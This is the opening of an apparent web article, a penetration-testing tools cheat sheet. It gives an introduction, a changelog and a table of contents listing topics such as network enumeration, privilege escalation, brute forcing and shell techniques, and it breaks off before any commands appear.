&lt;p&gt;&lt;strong&gt;Penetration testing tools cheat sheet&lt;/strong&gt;, a quick reference high level overview for typical penetration testing engagements. Designed as a quick reference cheat sheet providing a high level overview of the &lt;strong&gt;typical&lt;/strong&gt; commands used during a &lt;a href=&quot;https://www.aptive.co.uk/cybersecurity/what-is-pentesting/&quot;&gt;penetration testing&lt;/a&gt; engagement. For more in depth information I’d recommend the man file for the tool, or a more specific pen testing cheat sheet from the menu on the right.&lt;/p&gt;

&lt;p&gt;The focus of this cheat sheet is infrastructure / network penetration testing, web application penetration testing is not covered here apart from a few SQLMap commands at the end and some web server enumeration. For Web Application Penetration Testing, check out the Web Application Hackers Hand Book, it is excellent for both learning and reference.&lt;/p&gt;

&lt;p&gt;If I’m missing any pen testing tools here give me a nudge on twitter.&lt;/p&gt;

&lt;h3 id=&quot;changelog&quot;&gt;Changelog&lt;/h3&gt;

&lt;p&gt;16/09/2020 - fixed some formatting issues.
17/02/2017 - Article updated, added loads more content, VPN, DNS tunneling, VLAN hopping etc - check out the TOC below.&lt;/p&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#introduction&quot; id=&quot;markdown-toc-introduction&quot;&gt;Introduction&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#changelog&quot; id=&quot;markdown-toc-changelog&quot;&gt;Changelog&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#pre-engagement&quot; id=&quot;markdown-toc-pre-engagement&quot;&gt;Pre-engagement&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#network-configuration&quot; id=&quot;markdown-toc-network-configuration&quot;&gt;Network Configuration&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#set-ip-address&quot; id=&quot;markdown-toc-set-ip-address&quot;&gt;Set IP Address&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#subnetting&quot; id=&quot;markdown-toc-subnetting&quot;&gt;Subnetting&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#osint&quot; id=&quot;markdown-toc-osint&quot;&gt;OSINT&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#passive-information-gathering&quot; id=&quot;markdown-toc-passive-information-gathering&quot;&gt;Passive Information Gathering&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#dns&quot; id=&quot;markdown-toc-dns&quot;&gt;DNS&lt;/a&gt;            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#whois-enumeration&quot; id=&quot;markdown-toc-whois-enumeration&quot;&gt;WHOIS enumeration&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#perform-dns-ip-lookup&quot; id=&quot;markdown-toc-perform-dns-ip-lookup&quot;&gt;Perform DNS IP Lookup&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#perform-mx-record-lookup&quot; id=&quot;markdown-toc-perform-mx-record-lookup&quot;&gt;Perform MX Record Lookup&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#perform-zone-transfer-with-dig&quot; id=&quot;markdown-toc-perform-zone-transfer-with-dig&quot;&gt;Perform Zone Transfer with DIG&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#dns-zone-transfers&quot; id=&quot;markdown-toc-dns-zone-transfers&quot;&gt;DNS Zone Transfers&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#email&quot; id=&quot;markdown-toc-email&quot;&gt;Email&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#simply-email&quot; id=&quot;markdown-toc-simply-email&quot;&gt;Simply Email&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#semi-active-information-gathering&quot; id=&quot;markdown-toc-semi-active-information-gathering&quot;&gt;Semi Active Information Gathering&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#basic-finger-printing&quot; id=&quot;markdown-toc-basic-finger-printing&quot;&gt;Basic Finger Printing&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#banner-grabbing-with-nc&quot; id=&quot;markdown-toc-banner-grabbing-with-nc&quot;&gt;Banner grabbing with NC&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#active-information-gathering&quot; id=&quot;markdown-toc-active-information-gathering&quot;&gt;Active Information Gathering&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#dns-bruteforce&quot; id=&quot;markdown-toc-dns-bruteforce&quot;&gt;DNS Bruteforce&lt;/a&gt;            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#dnsrecon&quot; id=&quot;markdown-toc-dnsrecon&quot;&gt;DNSRecon&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#port-scanning&quot; id=&quot;markdown-toc-port-scanning&quot;&gt;Port Scanning&lt;/a&gt;            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#nmap-commands&quot; id=&quot;markdown-toc-nmap-commands&quot;&gt;Nmap Commands&lt;/a&gt;                &lt;ul&gt;
                  &lt;li&gt;&lt;a href=&quot;#nmap-udp-scanning&quot; id=&quot;markdown-toc-nmap-udp-scanning&quot;&gt;Nmap UDP Scanning&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#udp-protocol-scanner&quot; id=&quot;markdown-toc-udp-protocol-scanner&quot;&gt;UDP Protocol Scanner&lt;/a&gt;&lt;/li&gt;
                  &lt;li&gt;&lt;a href=&quot;#other-host-discovery&quot; id=&quot;markdown-toc-other-host-discovery&quot;&gt;Other Host Discovery&lt;/a&gt;&lt;/li&gt;
                &lt;/ul&gt;
              &lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#enumeration--attacking-network-services&quot; id=&quot;markdown-toc-enumeration--attacking-network-services&quot;&gt;Enumeration &amp;amp; Attacking Network Services&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#samb--smb--windows-domain-enumeration&quot; id=&quot;markdown-toc-samb--smb--windows-domain-enumeration&quot;&gt;SAMB / SMB / Windows Domain Enumeration&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#samba-enumeration&quot; id=&quot;markdown-toc-samba-enumeration&quot;&gt;Samba Enumeration&lt;/a&gt;            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#smb-enumeration-tools&quot; id=&quot;markdown-toc-smb-enumeration-tools&quot;&gt;SMB Enumeration Tools&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#fingerprint-smb-version&quot; id=&quot;markdown-toc-fingerprint-smb-version&quot;&gt;Fingerprint SMB Version&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#find-open-smb-shares&quot; id=&quot;markdown-toc-find-open-smb-shares&quot;&gt;Find open SMB Shares&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#enumerate-smb-users&quot; id=&quot;markdown-toc-enumerate-smb-users&quot;&gt;Enumerate SMB Users&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#manual-null-session-testing&quot; id=&quot;markdown-toc-manual-null-session-testing&quot;&gt;Manual Null session testing:&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#nbtscan-unixwiz&quot; id=&quot;markdown-toc-nbtscan-unixwiz&quot;&gt;NBTScan unixwiz&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#llmnr--nbt-ns-spoofing&quot; id=&quot;markdown-toc-llmnr--nbt-ns-spoofing&quot;&gt;LLMNR / NBT-NS Spoofing&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#metasploit-llmnr--netbios-requests&quot; id=&quot;markdown-toc-metasploit-llmnr--netbios-requests&quot;&gt;Metasploit LLMNR / NetBIOS requests&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#responderpy&quot; id=&quot;markdown-toc-responderpy&quot;&gt;Responder.py&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#snmp-enumeration-tools&quot; id=&quot;markdown-toc-snmp-enumeration-tools&quot;&gt;SNMP Enumeration Tools&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#snmpv3-enumeration-tools&quot; id=&quot;markdown-toc-snmpv3-enumeration-tools&quot;&gt;SNMPv3 Enumeration Tools&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#r-services-enumeration&quot; id=&quot;markdown-toc-r-services-enumeration&quot;&gt;R Services Enumeration&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#rsh-enumeration&quot; id=&quot;markdown-toc-rsh-enumeration&quot;&gt;RSH Enumeration&lt;/a&gt;            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#rsh-run-commands&quot; id=&quot;markdown-toc-rsh-run-commands&quot;&gt;RSH Run Commands&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#metasploit-rsh-login-scanner&quot; id=&quot;markdown-toc-metasploit-rsh-login-scanner&quot;&gt;Metasploit RSH Login Scanner&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#rusers-show-logged-in-users&quot; id=&quot;markdown-toc-rusers-show-logged-in-users&quot;&gt;rusers Show Logged in Users&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#rusers-scan-whole-subnet&quot; id=&quot;markdown-toc-rusers-scan-whole-subnet&quot;&gt;rusers scan whole Subnet&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#finger-enumeration&quot; id=&quot;markdown-toc-finger-enumeration&quot;&gt;Finger Enumeration&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#finger-a-specific-username&quot; id=&quot;markdown-toc-finger-a-specific-username&quot;&gt;Finger a Specific Username&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#solaris-bug-that-shows-all-logged-in-users&quot; id=&quot;markdown-toc-solaris-bug-that-shows-all-logged-in-users&quot;&gt;Solaris bug that shows all logged in users:&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#rwho&quot; id=&quot;markdown-toc-rwho&quot;&gt;rwho&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#tls--ssl-testing&quot; id=&quot;markdown-toc-tls--ssl-testing&quot;&gt;TLS &amp;amp; SSL Testing&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#testsslsh&quot; id=&quot;markdown-toc-testsslsh&quot;&gt;testssl.sh&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#vulnerability-assessment&quot; id=&quot;markdown-toc-vulnerability-assessment&quot;&gt;Vulnerability Assessment&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#database-penetration-testing&quot; id=&quot;markdown-toc-database-penetration-testing&quot;&gt;Database Penetration Testing&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#oracle&quot; id=&quot;markdown-toc-oracle&quot;&gt;Oracle&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#fingerprint-oracle-tns-version&quot; id=&quot;markdown-toc-fingerprint-oracle-tns-version&quot;&gt;Fingerprint Oracle TNS Version&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#brute-force-oracle-user-accounts&quot; id=&quot;markdown-toc-brute-force-oracle-user-accounts&quot;&gt;Brute force oracle user accounts&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#oracle-privilege-escalation&quot; id=&quot;markdown-toc-oracle-privilege-escalation&quot;&gt;Oracle Privilege Escalation&lt;/a&gt;            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#identify-default-accounts-within-oracle-db-using-nmap-nse-scripts&quot; id=&quot;markdown-toc-identify-default-accounts-within-oracle-db-using-nmap-nse-scripts&quot;&gt;Identify default accounts within oracle db using NMAP NSE scripts:&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#how-to-identify-the-current-privilege-level-for-an-oracle-user&quot; id=&quot;markdown-toc-how-to-identify-the-current-privilege-level-for-an-oracle-user&quot;&gt;How to identify the current privilege level for an oracle user:&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#oracle-priv-esc-and-obtain-dba-access&quot; id=&quot;markdown-toc-oracle-priv-esc-and-obtain-dba-access&quot;&gt;Oracle priv esc and obtain DBA access:&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#run-the-exploit-with-a-select-query&quot; id=&quot;markdown-toc-run-the-exploit-with-a-select-query&quot;&gt;Run the exploit with a select query:&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#remove-the-exploit-using&quot; id=&quot;markdown-toc-remove-the-exploit-using&quot;&gt;Remove the exploit using:&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#get-oracle-reverse-os-shell&quot; id=&quot;markdown-toc-get-oracle-reverse-os-shell&quot;&gt;Get Oracle Reverse os-shell:&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#mssql&quot; id=&quot;markdown-toc-mssql&quot;&gt;MSSQL&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#bruteforce-mssql-login&quot; id=&quot;markdown-toc-bruteforce-mssql-login&quot;&gt;Bruteforce MSSQL Login&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#metasploit-mssql-shell&quot; id=&quot;markdown-toc-metasploit-mssql-shell&quot;&gt;Metasploit MSSQL Shell&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#network&quot; id=&quot;markdown-toc-network&quot;&gt;Network&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#plinkexe-tunnel&quot; id=&quot;markdown-toc-plinkexe-tunnel&quot;&gt;Plink.exe Tunnel&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#pivoting&quot; id=&quot;markdown-toc-pivoting&quot;&gt;Pivoting&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#ssh-pivoting&quot; id=&quot;markdown-toc-ssh-pivoting&quot;&gt;SSH Pivoting&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#meterpreter-pivoting&quot; id=&quot;markdown-toc-meterpreter-pivoting&quot;&gt;Meterpreter Pivoting&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#ttl-finger-printing&quot; id=&quot;markdown-toc-ttl-finger-printing&quot;&gt;TTL Finger Printing&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#ipv4-cheat-sheets&quot; id=&quot;markdown-toc-ipv4-cheat-sheets&quot;&gt;IPv4 Cheat Sheets&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#classful-ip-ranges&quot; id=&quot;markdown-toc-classful-ip-ranges&quot;&gt;Classful IP Ranges&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#ipv4-private-address-ranges&quot; id=&quot;markdown-toc-ipv4-private-address-ranges&quot;&gt;IPv4 Private Address Ranges&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#ipv4-subnet-cheat-sheet&quot; id=&quot;markdown-toc-ipv4-subnet-cheat-sheet&quot;&gt;IPv4 Subnet Cheat Sheet&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#vlan-hopping&quot; id=&quot;markdown-toc-vlan-hopping&quot;&gt;VLAN Hopping&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#vpn-pentesting-tools&quot; id=&quot;markdown-toc-vpn-pentesting-tools&quot;&gt;VPN Pentesting Tools&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#ikeforce&quot; id=&quot;markdown-toc-ikeforce&quot;&gt;IKEForce&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#ike-aggressive-mode-psk-cracking&quot; id=&quot;markdown-toc-ike-aggressive-mode-psk-cracking&quot;&gt;IKE Aggressive Mode PSK Cracking&lt;/a&gt;            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#step-1-idenitfy-ike-servers&quot; id=&quot;markdown-toc-step-1-idenitfy-ike-servers&quot;&gt;Step 1: Idenitfy IKE Servers&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#step-2-enumerate-group-name-with-ikeforce&quot; id=&quot;markdown-toc-step-2-enumerate-group-name-with-ikeforce&quot;&gt;Step 2: Enumerate group name with IKEForce&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#step-3-use-ike-scan-to-capture-the-psk-hash&quot; id=&quot;markdown-toc-step-3-use-ike-scan-to-capture-the-psk-hash&quot;&gt;Step 3: Use ike-scan to capture the PSK hash&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#step-4-use-psk-crack-to-crack-the-psk-hash&quot; id=&quot;markdown-toc-step-4-use-psk-crack-to-crack-the-psk-hash&quot;&gt;Step 4: Use psk-crack to crack the PSK hash&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#pptp-hacking&quot; id=&quot;markdown-toc-pptp-hacking&quot;&gt;PPTP Hacking&lt;/a&gt;            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#nmap-pptp-fingerprint&quot; id=&quot;markdown-toc-nmap-pptp-fingerprint&quot;&gt;NMAP PPTP Fingerprint:&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#pptp-dictionary-attack&quot; id=&quot;markdown-toc-pptp-dictionary-attack&quot;&gt;PPTP Dictionary Attack&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#dns-tunneling&quot; id=&quot;markdown-toc-dns-tunneling&quot;&gt;DNS Tunneling&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#attacking-machine&quot; id=&quot;markdown-toc-attacking-machine&quot;&gt;Attacking Machine&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#bof--exploit&quot; id=&quot;markdown-toc-bof--exploit&quot;&gt;BOF / Exploit&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#exploit-research&quot; id=&quot;markdown-toc-exploit-research&quot;&gt;Exploit Research&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#searching-for-exploits&quot; id=&quot;markdown-toc-searching-for-exploits&quot;&gt;Searching for Exploits&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#compiling-windows-exploits-on-kali&quot; id=&quot;markdown-toc-compiling-windows-exploits-on-kali&quot;&gt;Compiling Windows Exploits on Kali&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#cross-compiling-exploits&quot; id=&quot;markdown-toc-cross-compiling-exploits&quot;&gt;Cross Compiling Exploits&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#exploiting-common-vulnerabilities&quot; id=&quot;markdown-toc-exploiting-common-vulnerabilities&quot;&gt;Exploiting Common Vulnerabilities&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#exploiting-shellshock&quot; id=&quot;markdown-toc-exploiting-shellshock&quot;&gt;Exploiting Shellshock&lt;/a&gt;            &lt;ul&gt;
              &lt;li&gt;&lt;a href=&quot;#cat-file-view-file-contents&quot; id=&quot;markdown-toc-cat-file-view-file-contents&quot;&gt;cat file (view file contents)&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#shell-shock-run-bind-shell&quot; id=&quot;markdown-toc-shell-shock-run-bind-shell&quot;&gt;Shell Shock run bind shell&lt;/a&gt;&lt;/li&gt;
              &lt;li&gt;&lt;a href=&quot;#shell-shock-reverse-shell&quot; id=&quot;markdown-toc-shell-shock-reverse-shell&quot;&gt;Shell Shock reverse Shell&lt;/a&gt;&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#simple-local-web-servers&quot; id=&quot;markdown-toc-simple-local-web-servers&quot;&gt;Simple Local Web Servers&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#mounting-file-shares&quot; id=&quot;markdown-toc-mounting-file-shares&quot;&gt;Mounting File Shares&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#http--https-webserver-enumeration&quot; id=&quot;markdown-toc-http--https-webserver-enumeration&quot;&gt;HTTP / HTTPS Webserver Enumeration&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#packet-inspection&quot; id=&quot;markdown-toc-packet-inspection&quot;&gt;Packet Inspection&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#username-enumeration&quot; id=&quot;markdown-toc-username-enumeration&quot;&gt;Username Enumeration&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#smb-user-enumeration&quot; id=&quot;markdown-toc-smb-user-enumeration&quot;&gt;SMB User Enumeration&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#snmp-user-enumeration&quot; id=&quot;markdown-toc-snmp-user-enumeration&quot;&gt;SNMP User Enumeration&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#passwords&quot; id=&quot;markdown-toc-passwords&quot;&gt;Passwords&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#wordlists&quot; id=&quot;markdown-toc-wordlists&quot;&gt;Wordlists&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#brute-forcing-services&quot; id=&quot;markdown-toc-brute-forcing-services&quot;&gt;Brute Forcing Services&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#hydra-ftp-brute-force&quot; id=&quot;markdown-toc-hydra-ftp-brute-force&quot;&gt;Hydra FTP Brute Force&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#hydra-pop3-brute-force&quot; id=&quot;markdown-toc-hydra-pop3-brute-force&quot;&gt;Hydra POP3 Brute Force&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#hydra-smtp-brute-force&quot; id=&quot;markdown-toc-hydra-smtp-brute-force&quot;&gt;Hydra SMTP Brute Force&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#password-cracking&quot; id=&quot;markdown-toc-password-cracking&quot;&gt;Password Cracking&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#john-the-ripper---jtr&quot; id=&quot;markdown-toc-john-the-ripper---jtr&quot;&gt;John The Ripper - JTR&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#windows-penetration-testing-commands&quot; id=&quot;markdown-toc-windows-penetration-testing-commands&quot;&gt;Windows Penetration Testing Commands&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#linux-penetration-testing-commands&quot; id=&quot;markdown-toc-linux-penetration-testing-commands&quot;&gt;Linux Penetration Testing Commands&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#compiling-exploits&quot; id=&quot;markdown-toc-compiling-exploits&quot;&gt;Compiling Exploits&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#identifying-if-c-code-is-for-windows-or-linux&quot; id=&quot;markdown-toc-identifying-if-c-code-is-for-windows-or-linux&quot;&gt;Identifying if C code is for Windows or Linux&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#build-exploit-gcc&quot; id=&quot;markdown-toc-build-exploit-gcc&quot;&gt;Build Exploit GCC&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#gcc-compile-32bit-exploit-on-64bit-kali&quot; id=&quot;markdown-toc-gcc-compile-32bit-exploit-on-64bit-kali&quot;&gt;GCC Compile 32Bit Exploit on 64Bit Kali&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#compile-windows-exe-on-linux&quot; id=&quot;markdown-toc-compile-windows-exe-on-linux&quot;&gt;Compile Windows .exe on Linux&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#suid-binary&quot; id=&quot;markdown-toc-suid-binary&quot;&gt;SUID Binary&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#suid-c-shell-for-binbash&quot; id=&quot;markdown-toc-suid-c-shell-for-binbash&quot;&gt;SUID C Shell for /bin/bash&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#suid-c-shell-for-binsh&quot; id=&quot;markdown-toc-suid-c-shell-for-binsh&quot;&gt;SUID C Shell for /bin/sh&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#building-the-suid-shell-binary&quot; id=&quot;markdown-toc-building-the-suid-shell-binary&quot;&gt;Building the SUID Shell binary&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#reverse-shells&quot; id=&quot;markdown-toc-reverse-shells&quot;&gt;Reverse Shells&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#tty-shells&quot; id=&quot;markdown-toc-tty-shells&quot;&gt;TTY Shells&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#python-tty-shell-trick&quot; id=&quot;markdown-toc-python-tty-shell-trick&quot;&gt;Python TTY Shell Trick&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#spawn-interactive-sh-shell&quot; id=&quot;markdown-toc-spawn-interactive-sh-shell&quot;&gt;Spawn Interactive sh shell&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#spawn-perl-tty-shell&quot; id=&quot;markdown-toc-spawn-perl-tty-shell&quot;&gt;Spawn Perl TTY Shell&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#spawn-ruby-tty-shell&quot; id=&quot;markdown-toc-spawn-ruby-tty-shell&quot;&gt;Spawn Ruby TTY Shell&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#spawn-lua-tty-shell&quot; id=&quot;markdown-toc-spawn-lua-tty-shell&quot;&gt;Spawn Lua TTY Shell&lt;/a&gt;&lt;/li&gt;
